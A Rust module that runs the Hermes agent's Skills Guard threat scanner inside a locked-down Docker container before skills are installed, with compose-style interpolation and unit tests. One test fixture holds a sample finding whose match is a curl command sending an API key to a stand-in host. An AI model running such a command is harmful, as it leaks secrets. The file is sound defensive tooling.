// The pre-install scan — Hermes' own Skills Guard, run where Hermes keeps it.
//
// WHAT HERMES DOES. `hermes skills install` quarantines the fetched files,
// runs `tools/skills_guard.py`'s `scan_skill` over them (127 regex threat
// patterns across exfiltration, injection, destructive commands, persistence
// and the rest; invisible-unicode and structural checks; the doc-only
// demotions), and lets `should_allow_install` decide by trust and verdict:
//
//                  safe     caution   dangerous
//     builtin      allow    allow     allow
//     trusted      allow    allow     block
//     community    allow    block     block
//
// The trust level comes from the source string the scan is handed
// ("official" → builtin; a repo on Hermes' TRUSTED_REPOS list → trusted;
// anything else → community).
//
// WHAT THIS DOES. The same two functions, unmodified, from the fleet's own
// Hermes image: one `docker run --rm` per scan with no network, a read-only
// root, every capability dropped, an unprivileged uid and a small tmpfs to
// unpack into. The skill goes in as a tar on stdin; one JSON line comes back.
// Running Hermes' scanner instead of porting it keeps the rules and their
// version exactly those of the agents that will load the skill — a port would
// drift the first week Hermes added a pattern. The image is the one the
// chassis runs (`HERMES_IMAGE` and all), so a pinned fleet scans with its pin.
// With no chassis yet, it is the chassis template's own image line, resolved
// the same way, so the scan never runs on an image no agent would.
//
// BOUNDED. At most SCAN_SLOTS scans run at once, and concurrent requests
// for the same (skill, commit, image) share one container. Each scan
// container is named, so a scan that times out is removed, not just
// abandoned: killing the docker CLI leaves a `--rm` container running.
//
// FAIL CLOSED. A scan that cannot run — no docker, no image, no chassis and
// no template, a timeout, an unreadable answer — is an error, and the route
// installs nothing.

use std::collections::HashMap;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::{Arc, LazyLock, Mutex};
use std::time::{Duration, SystemTime, UNIX_EPOCH};

use serde::{Deserialize, Serialize};
use tokio::io::AsyncWriteExt;

use crate::fetch::FetchedSkill;

/// A cold image pull dominates; the scan itself is about a second.
const SCAN_TIMEOUT: Duration = Duration::from_secs(180);
const PYTHON: &str = "/opt/hermes/.venv/bin/python";
const CACHE_SLOTS: usize = 32;
/// Scan containers at once. Each is capped at 512 MB; the third click waits.
const SCAN_SLOTS: usize = 2;
const CONTAINER_PREFIX: &str = "talaria-skill-scan";

/// Runs inside the container under `python -I` (isolated: no cwd, no user
/// site, no PYTHON* env on the import path). argv: name, source, and a trust
/// override ("" for none) the install policy judges with. stdin: an
/// uncompressed tar of the skill's files. stdout's last line: the verdict.
const DRIVER: &str = r#"
import io, json, sys, tarfile, tempfile, pathlib
from dataclasses import asdict
sys.path.insert(0, "/opt/hermes")
from tools.skills_guard import SCANNER_VERSION, scan_skill, should_allow_install
name, source, trust = sys.argv[1], sys.argv[2], sys.argv[3]
root = pathlib.Path(tempfile.mkdtemp(dir="/tmp")) / name
root.mkdir()
with tarfile.open(fileobj=io.BytesIO(sys.stdin.buffer.read()), mode="r:") as tf:
    tf.extractall(root, filter="data")
result = scan_skill(root, source=source)
if trust:
    result.trust_level = trust
allowed, reason = should_allow_install(result)
print(json.dumps({
    "scanner": SCANNER_VERSION,
    "verdict": result.verdict,
    "trustLevel": result.trust_level,
    "allowed": allowed,
    "reason": reason,
    "summary": result.summary,
    "findings": [asdict(f) for f in result.findings],
}))
"#;

/// One Skills Guard finding, as Hermes reports it.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[serde(rename_all = "camelCase")]
pub struct Finding {
    #[serde(alias = "pattern_id")]
    pub pattern_id: String,
    /// critical | high | medium | low
    pub severity: String,
    pub category: String,
    pub file: String,
    pub line: i64,
    #[serde(rename = "match")]
    pub matched: String,
    pub description: String,
}

/// The scan's answer, as the routes hand it to the picker.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[serde(rename_all = "camelCase")]
pub struct ScanReport {
    /// Hermes' SCANNER_VERSION, e.g. "skills-guard-v10".
    pub scanner: String,
    /// safe | caution | dangerous
    pub verdict: String,
    /// The trust level Hermes resolved from the source.
    pub trust_level: String,
    /// Hermes' `should_allow_install`: true allow, false block, null "ask"
    /// (agent-created skills only) — anything but true installs nothing.
    pub allowed: Option<bool>,
    pub reason: String,
    pub summary: String,
    pub findings: Vec<Finding>,
    /// The image that ran the scan.
    #[serde(default)]
    pub image: String,
}

impl ScanReport {
    pub fn permits_install(&self) -> bool {
        self.allowed == Some(true)
    }
}

/// Compose's interpolation, as far as the chassis needs it: `$NAME`,
/// `${NAME}`, `${NAME:-default}` / `${NAME-default}`, `${NAME:+alt}` /
/// `${NAME+alt}`, `${NAME:?msg}` / `${NAME?msg}` and `$$`. Names resolve the
/// way compose resolves them for the chassis: the process environment first,
/// then the fleet's own .env (`lookup`'s second source). An unset name with
/// no default is empty, as in compose; a `?` form that fires, or a form
/// compose would not accept, is an error — the scan then does not run.
pub fn interpolate(s: &str, lookup: &dyn Fn(&str) -> Option<String>) -> Result<String, String> {
    let ident_len = |t: &str| {
        t.bytes()
            .take_while(|b| b.is_ascii_alphanumeric() || *b == b'_')
            .count()
    };
    let mut out = String::new();
    let mut rest = s;
    while let Some(i) = rest.find('$') {
        out.push_str(&rest[..i]);
        let after = &rest[i + 1..];
        if let Some(body) = after.strip_prefix('{') {
            let end = body
                .find('}')
                .ok_or_else(|| format!("unclosed ${{ in {s:?}"))?;
            let expr = &body[..end];
            let (name, op) = expr.split_at(ident_len(expr));
            if name.is_empty() {
                return Err(format!("${{{expr}}} names no variable"));
            }
            let value = lookup(name);
            let set = value.is_some();
            let filled = value.as_deref().is_some_and(|v| !v.is_empty());
            let picked = if op.is_empty() {
                value.unwrap_or_default()
            } else if let Some(d) = op.strip_prefix(":-") {
                if filled {
                    value.unwrap_or_default()
                } else {
                    d.to_string()
                }
            } else if let Some(d) = op.strip_prefix('-') {
                if set {
                    value.unwrap_or_default()
                } else {
                    d.to_string()
                }
            } else if let Some(alt) = op.strip_prefix(":+") {
                if filled {
                    alt.to_string()
                } else {
                    String::new()
                }
            } else if let Some(alt) = op.strip_prefix('+') {
                if set { alt.to_string() } else { String::new() }
            } else if let Some(msg) = op.strip_prefix(":?").or_else(|| op.strip_prefix('?')) {
                let ok = if op.starts_with(':') { filled } else { set };
                if !ok {
                    return Err(format!("{name} is required: {msg}"));
                }
                value.unwrap_or_default()
            } else {
                return Err(format!("${{{expr}}} is not a form compose interpolates"));
            };
            out.push_str(&picked);
            rest = &body[end + 1..];
        } else if let Some(escaped) = after.strip_prefix('$') {
            out.push('$');
            rest = escaped;
        } else {
            let len = ident_len(after);
            if len == 0 {
                out.push('$');
                rest = after;
                continue;
            }
            out.push_str(&lookup(&after[..len]).unwrap_or_default());
            rest = &after[len..];
        }
    }
    out.push_str(rest);
    Ok(out)
}

/// `KEY=value` lines of an env file (quotes stripped, comments skipped).
fn env_file_value(text: &str, key: &str) -> Option<String> {
    text.lines().find_map(|line| {
        let line = line.trim();
        let line = line.strip_prefix("export ").unwrap_or(line);
        let (k, v) = line.split_once('=')?;
        (k.trim() == key).then(|| {
            let v = v.trim();
            v.strip_prefix('"')
                .and_then(|x| x.strip_suffix('"'))
                .or_else(|| v.strip_prefix('\'').and_then(|x| x.strip_suffix('\'')))
                .unwrap_or(v)
                .to_string()
        })
    })
}

/// The chassis template the fleet's chassis is copied from, on the same
/// path convention as `talaria_fleet_layout::seed_skills_dir` (the repo's
/// `scripts/`, one up from the api's working directory — in dev and in the
/// image alike).
fn chassis_template() -> PathBuf {
    std::env::current_dir()
        .map(|c| c.join("../scripts/chassis.template.yml"))
        .unwrap_or_else(|_| PathBuf::from("../scripts/chassis.template.yml"))
}

/// `service.image` from a chassis-shaped YAML document, uninterpolated.
fn service_image(text: &str) -> Option<String> {
    serde_yaml_ng::from_str::<serde_yaml_ng::Value>(text)
        .ok()?
        .get("service")?
        .get("image")?
        .as_str()
        .map(str::to_string)
        .filter(|s| !s.trim().is_empty())
}

/// The image the chassis runs agents on, resolved the way compose would.
/// A fleet with no chassis yet (or one that names no image) reads the
/// template's line instead — the chassis it will get — so `HERMES_IMAGE`
/// and the template's own pin both still apply. Neither readable is an
/// error: there is no image to vouch for.
pub async fn hermes_image(
    chassis: &Path,
    template: &Path,
    fleet_env: &Path,
) -> Result<String, String> {
    let from = |p: &Path| {
        let p = p.to_path_buf();
        async move {
            tokio::fs::read_to_string(&p)
                .await
                .ok()
                .and_then(|t| service_image(&t))
        }
    };
    let raw = match from(chassis).await {
        Some(raw) => raw,
        None => from(template).await.ok_or_else(|| {
            format!(
                "no Hermes image to scan with: neither {} nor {} names one",
                chassis.display(),
                template.display()
            )
        })?,
    };
    let env_text = tokio::fs::read_to_string(fleet_env)
        .await
        .unwrap_or_default();
    let lookup = |name: &str| {
        std::env::var(name)
            .ok()
            .or_else(|| env_file_value(&env_text, name))
    };
    let image = interpolate(&raw, &lookup)
        .map_err(|e| format!("the chassis image {raw:?} does not resolve: {e}"))?;
    let image = image.trim();
    if image.is_empty() {
        return Err(format!("the chassis image {raw:?} resolves to nothing"));
    }
    Ok(image.to_string())
}

/// An uncompressed tar of the skill's files, 0644 each — the mode the
/// install writes them with.
fn skill_tar(files: &[(String, Vec<u8>)]) -> Result<Vec<u8>, String> {
    let mut builder = tar::Builder::new(Vec::new());
    for (path, body) in files {
        let mut header = tar::Header::new_gnu();
        header.set_entry_type(tar::EntryType::Regular);
        header.set_size(body.len() as u64);
        header.set_mode(0o644);
        header.set_mtime(0);
        builder
            .append_data(&mut header, path, body.as_slice())
            .map_err(|e| format!("could not stage {path} for the scan: {e}"))?;
    }
    builder
        .into_inner()
        .map_err(|e| format!("could not stage the skill for the scan: {e}"))
}

/// The `docker run` argv for one scan. Hardened like the MCP package
/// sandbox (talaria-mcp's pkg.rs): no network at all, read-only root, every
/// capability dropped, no privilege gain, nobody's uid, bounded memory and
/// pids, and the only writable path a small tmpfs. `container` names it,
/// so a scan that times out can be removed.
pub fn scan_argv(
    container: &str,
    image: &str,
    name: &str,
    source: &str,
    trust: Option<&str>,
) -> Vec<String> {
    [
        "run",
        "--rm",
        "-i",
        "--name",
        container,
        "--network",
        "none",
        "--read-only",
        "--tmpfs",
        "/tmp:rw,nosuid,nodev,size=96m",
        "--cap-drop",
        "ALL",
        "--security-opt",
        "no-new-privileges:true",
        "--user",
        "65534:65534",
        "--memory",
        "512m",
        "--pids-limit",
        "64",
        "-e",
        "HOME=/tmp",
        "--entrypoint",
        PYTHON,
        image,
        "-I",
        "-c",
        DRIVER,
        name,
        source,
        trust.unwrap_or(""),
    ]
    .iter()
    .map(|s| s.to_string())
    .collect()
}

/// The verdict line: the LAST line of stdout that parses (Hermes may log
/// above it).
pub fn parse_report(stdout: &str, image: &str) -> Result<ScanReport, String> {
    stdout
        .lines()
        .rev()
        .find_map(|l| serde_json::from_str::<ScanReport>(l.trim()).ok())
        .map(|mut r| {
            r.image = image.to_string();
            r
        })
        .ok_or_else(|| "the skill scan printed no verdict".to_string())
}

/// A container name no other scan holds: this process, a counter, the clock
/// (a scan leaked by a crashed api must not collide with the next one).
fn container_name() -> String {
    static SEQ: AtomicU64 = AtomicU64::new(0);
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.subsec_nanos())
        .unwrap_or(0);
    format!(
        "{CONTAINER_PREFIX}-{}-{}-{nanos:09}",
        std::process::id(),
        SEQ.fetch_add(1, Ordering::Relaxed)
    )
}

async fn run_scan(image: &str, skill: &FetchedSkill) -> Result<ScanReport, String> {
    let tarball = skill_tar(&skill.files)?;
    let container = container_name();
    let argv = scan_argv(
        &container,
        image,
        &skill.name,
        &skill.scan_source,
        skill.trust_override,
    );
    let mut child = tokio::process::Command::new("docker")
        .args(&argv)
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .kill_on_drop(true)
        .spawn()
        .map_err(|e| format!("docker could not start: {e}"))?;
    let mut stdin = child.stdin.take().ok_or("docker gave no stdin")?;
    let feed = async move {
        let wrote = stdin.write_all(&tarball).await;
        drop(stdin);
        wrote
    };
    let run = async {
        let (fed, out) = tokio::join!(feed, child.wait_with_output());
        fed.map_err(|e| format!("could not hand the skill to the scan: {e}"))?;
        out.map_err(|e| format!("the scan container failed: {e}"))
    };
    let out = match tokio::time::timeout(SCAN_TIMEOUT, run).await {
        Ok(out) => out?,
        Err(_) => {
            // The CLI dies with the dropped future; the container would not.
            let removed = tokio::process::Command::new("docker")
                .args(["rm", "-f", &container])
                .stdout(std::process::Stdio::null())
                .stderr(std::process::Stdio::null())
                .status()
                .await;
            if !removed.is_ok_and(|s| s.success()) {
                tracing::warn!("[skills] timed-out scan container {container} was not removed");
            }
            return Err(format!(
                "the skill scan timed out after {}s",
                SCAN_TIMEOUT.as_secs()
            ));
        }
    };
    let stdout = String::from_utf8_lossy(&out.stdout);
    if !out.status.success() {
        let stderr = String::from_utf8_lossy(&out.stderr);
        let tail: String = stderr
            .lines()
            .rev()
            .take(3)
            .collect::<Vec<_>>()
            .into_iter()
            .rev()
            .collect::<Vec<_>>()
            .join(" | ");
        return Err(format!(
            "the skill scan exited {} on {image}: {tail}",
            out.status.code().unwrap_or(-1)
        ));
    }
    parse_report(&stdout, image)
}

type CacheKey = (String, String, String);
static CACHE: LazyLock<Mutex<Vec<(CacheKey, Arc<ScanReport>)>>> =
    LazyLock::new(|| Mutex::new(Vec::new()));
/// One lock per key a scan is running for: a second request for the same
/// key waits on it and then reads the cache, instead of starting a second
/// container.
static IN_FLIGHT: LazyLock<Mutex<HashMap<CacheKey, Arc<tokio::sync::Mutex<()>>>>> =
    LazyLock::new(|| Mutex::new(HashMap::new()));
static SLOTS: LazyLock<tokio::sync::Semaphore> =
    LazyLock::new(|| tokio::sync::Semaphore::new(SCAN_SLOTS));

fn cached(key: &CacheKey) -> Option<Arc<ScanReport>> {
    let guard = CACHE.lock().unwrap_or_else(|p| p.into_inner());
    guard.iter().find(|(k, _)| k == key).map(|(_, r)| r.clone())
}

/// Scan a fetched skill with Hermes' Skills Guard. Cached per (identifier,
/// commit, image): the same files under the same scanner get the same
/// verdict, so the preview → install pair runs one container.
pub async fn scan(skill: &FetchedSkill) -> Result<Arc<ScanReport>, String> {
    let image = hermes_image(
        &talaria_fleet_layout::chassis_file(),
        &chassis_template(),
        &talaria_fleet_layout::fleet_env(),
    )
    .await?;
    let key: CacheKey = (skill.id.clone(), skill.commit.clone(), image.clone());
    if let Some(r) = cached(&key) {
        return Ok(r);
    }
    let lock = {
        let mut map = IN_FLIGHT.lock().unwrap_or_else(|p| p.into_inner());
        map.entry(key.clone()).or_default().clone()
    };
    let _same_key = lock.lock().await;
    // Whoever held the lock may have just filled the cache.
    if let Some(r) = cached(&key) {
        return Ok(r);
    }
    let result = {
        let _slot = SLOTS
            .acquire()
            .await
            .map_err(|_| "the scan queue is closed".to_string())?;
        run_scan(&image, skill).await.map(Arc::new)
    };
    if let Ok(report) = &result {
        let mut guard = CACHE.lock().unwrap_or_else(|p| p.into_inner());
        guard.retain(|(k, _)| *k != key);
        while guard.len() >= CACHE_SLOTS {
            guard.remove(0);
        }
        guard.push((key.clone(), report.clone()));
    }
    // The last one out drops the key's lock (the map holds one reference,
    // this call another; a waiter holds a third and keeps it).
    {
        let mut map = IN_FLIGHT.lock().unwrap_or_else(|p| p.into_inner());
        if map.get(&key).is_some_and(|l| Arc::strong_count(l) <= 2) {
            map.remove(&key);
        }
    }
    result
}

#[cfg(test)]
mod tests {
    use super::*;

    fn env(pairs: &[(&str, &str)]) -> impl Fn(&str) -> Option<String> {
        let owned: Vec<(String, String)> = pairs
            .iter()
            .map(|(k, v)| (k.to_string(), v.to_string()))
            .collect();
        move |name: &str| {
            owned
                .iter()
                .find(|(k, _)| k == name)
                .map(|(_, v)| v.clone())
        }
    }

    #[test]
    fn the_chassis_image_interpolates_like_compose() {
        let i = |s: &str, lookup: &dyn Fn(&str) -> Option<String>| interpolate(s, lookup).unwrap();
        let none = env(&[]);
        assert_eq!(
            i("${HERMES_IMAGE:-nousresearch/hermes-agent:latest}", &none),
            "nousresearch/hermes-agent:latest"
        );
        let set = env(&[(
            "HERMES_IMAGE",
            "nousresearch/hermes-agent:v0.22.4@sha256:abc",
        )]);
        assert_eq!(
            i("${HERMES_IMAGE:-nousresearch/hermes-agent:latest}", &set),
            "nousresearch/hermes-agent:v0.22.4@sha256:abc"
        );
        // `:-` treats empty as unset; `-` does not.
        let empty = env(&[("HERMES_IMAGE", "")]);
        assert_eq!(i("${HERMES_IMAGE:-d}", &empty), "d");
        assert_eq!(i("${HERMES_IMAGE-d}", &empty), "");
        // A default may itself carry a dash (a tag, a digest).
        assert_eq!(i("${IMG:-a/b-c:v1-rc}", &none), "a/b-c:v1-rc");
        // `:+` / `+` substitute only when set (and, for `:+`, non-empty).
        assert_eq!(i("x${T:+-tag}", &set), "x");
        assert_eq!(i("x${HERMES_IMAGE:+-alt}", &set), "x-alt");
        assert_eq!(i("x${HERMES_IMAGE:+-alt}", &empty), "x");
        assert_eq!(i("x${HERMES_IMAGE+-alt}", &empty), "x-alt");
        // `:?` / `?` refuse an unset (or, for `:?`, empty) name.
        assert_eq!(
            i("${HERMES_IMAGE:?pin it}", &set),
            "nousresearch/hermes-agent:v0.22.4@sha256:abc"
        );
        assert!(
            interpolate("${HERMES_IMAGE:?pin it}", &empty)
                .unwrap_err()
                .contains("pin it")
        );
        assert_eq!(i("${HERMES_IMAGE?pin it}", &empty), "");
        assert!(interpolate("${HERMES_IMAGE?pin it}", &none).is_err());
        // What compose would not accept is an error, not a guess.
        assert!(interpolate("${HERMES_IMAGE", &none).is_err());
        assert!(interpolate("${:-x}", &none).is_err());
        assert!(interpolate("${A/b}", &none).is_err());
        assert_eq!(i("x/$REPO:tag", &env(&[("REPO", "r")])), "x/r:tag");
        assert_eq!(i("a$$b", &none), "a$b");
        assert_eq!(i("plain:tag", &none), "plain:tag");
    }

    #[tokio::test]
    async fn no_chassis_reads_the_templates_image_and_neither_fails_closed() {
        let dir = std::env::temp_dir().join(format!("talaria-guard-test-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let chassis = dir.join("chassis.yml");
        let template = dir.join("chassis.template.yml");
        let fleet_env = dir.join(".env");
        // The name is this test's own, so the process env cannot set it.
        let var = format!("TALARIA_GUARD_TEST_IMAGE_{}", std::process::id());
        std::fs::write(
            &template,
            format!("service:\n  image: ${{{var}:-hermes:pinned@sha256:t}}\n"),
        )
        .unwrap();
        // No chassis yet: the template's line, interpolated.
        assert_eq!(
            hermes_image(&chassis, &template, &fleet_env).await.unwrap(),
            "hermes:pinned@sha256:t"
        );
        // The fleet .env still overrides it, as compose would.
        std::fs::write(&fleet_env, format!("{var}=hermes:from-env\n")).unwrap();
        assert_eq!(
            hermes_image(&chassis, &template, &fleet_env).await.unwrap(),
            "hermes:from-env"
        );
        // A chassis that names an image wins over the template.
        std::fs::write(&chassis, "service:\n  image: hermes:chassis\n").unwrap();
        assert_eq!(
            hermes_image(&chassis, &template, &fleet_env).await.unwrap(),
            "hermes:chassis"
        );
        // A chassis with no image line falls back to the template too.
        std::fs::write(&chassis, "service:\n  restart: always\n").unwrap();
        assert_eq!(
            hermes_image(&chassis, &template, &fleet_env).await.unwrap(),
            "hermes:from-env"
        );
        // Neither: no image to vouch for, so no scan.
        std::fs::remove_file(&template).unwrap();
        assert!(
            hermes_image(&chassis, &template, &fleet_env)
                .await
                .unwrap_err()
                .contains("no Hermes image")
        );
        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn env_file_lines_read_quoted_and_exported_values() {
        let text = "# fleet\nHERMES_KEY_A=sk\nexport HERMES_IMAGE=\"img:1\"\nOTHER='x'\n";
        assert_eq!(
            env_file_value(text, "HERMES_IMAGE").as_deref(),
            Some("img:1")
        );
        assert_eq!(env_file_value(text, "OTHER").as_deref(), Some("x"));
        assert_eq!(env_file_value(text, "MISSING"), None);
    }

    #[test]
    fn the_scan_container_has_no_network_no_caps_and_no_root() {
        let argv = scan_argv("scan-1", "img:1", "my-skill", "official", None);
        let pair = |a: &str, b: &str| argv.windows(2).any(|w| w[0] == a && w[1] == b);
        assert!(pair("--name", "scan-1"));
        assert!(pair("--network", "none"));
        assert!(pair("--cap-drop", "ALL"));
        assert!(pair("--security-opt", "no-new-privileges:true"));
        assert!(pair("--user", "65534:65534"));
        assert!(argv.contains(&"--read-only".to_string()));
        assert!(pair("--entrypoint", PYTHON));
        // The image, then python's own flags: isolated mode, the driver, and
        // exactly three arguments — the last empty when nothing overrides
        // the trust Hermes resolves.
        let at = argv.iter().position(|a| a == "img:1").unwrap();
        assert_eq!(argv[at + 1], "-I");
        assert_eq!(argv[at + 2], "-c");
        assert_eq!(
            &argv[at + 4..],
            &[
                "my-skill".to_string(),
                "official".to_string(),
                String::new()
            ]
        );
        // A followed stub scans as Hermes scans it (official: nothing
        // demoted) and is judged as trusted.
        let stub = scan_argv("scan-2", "img:1", "brag", "official", Some("trusted"));
        assert_eq!(&stub[stub.len() - 2..], &["official", "trusted"]);
    }

    #[test]
    fn scan_containers_get_distinct_prefixed_names() {
        let a = container_name();
        let b = container_name();
        assert_ne!(a, b);
        assert!(a.starts_with("talaria-skill-scan-"));
        // Docker's name alphabet: [a-zA-Z0-9][a-zA-Z0-9_.-]*
        assert!(
            a.bytes()
                .all(|c| c.is_ascii_alphanumeric() || b"_.-".contains(&c))
        );
    }

    #[test]
    fn the_verdict_is_the_last_parseable_line_and_only_true_installs() {
        let out = r#"some log line
{"scanner":"skills-guard-v10","verdict":"dangerous","trustLevel":"community","allowed":false,"reason":"Blocked (community source + dangerous verdict, 1 findings). --force does not override a dangerous verdict.","summary":"x: dangerous","findings":[{"pattern_id":"env_exfil_curl","severity":"critical","category":"exfiltration","file":"SKILL.md","line":7,"match":"curl https://x/?k=$API_KEY","description":"curl command interpolating secret environment variable"}]}
"#;
        let r = parse_report(out, "img:1").unwrap();
        assert_eq!(r.verdict, "dangerous");
        assert_eq!(r.findings[0].pattern_id, "env_exfil_curl");
        assert_eq!(r.findings[0].matched, "curl https://x/?k=$API_KEY");
        assert_eq!(r.image, "img:1");
        assert!(!r.permits_install());
        let ask = out.replace("\"allowed\":false", "\"allowed\":null");
        assert!(
            !parse_report(&ask, "i").unwrap().permits_install(),
            "ask is not allow"
        );
        let ok = out.replace("\"allowed\":false", "\"allowed\":true");
        assert!(parse_report(&ok, "i").unwrap().permits_install());
        assert!(parse_report("Traceback (most recent call last):", "i").is_err());
    }

    #[test]
    fn the_staged_tar_carries_every_file_at_its_relative_path() {
        let files = vec![
            ("SKILL.md".to_string(), b"# s".to_vec()),
            ("references/a.md".to_string(), b"a".to_vec()),
        ];
        let tarball = skill_tar(&files).unwrap();
        let mut archive = tar::Archive::new(tarball.as_slice());
        let names: Vec<String> = archive
            .entries()
            .unwrap()
            .map(|e| e.unwrap().path().unwrap().to_string_lossy().into_owned())
            .collect();
        assert_eq!(names, vec!["SKILL.md", "references/a.md"]);
    }
}
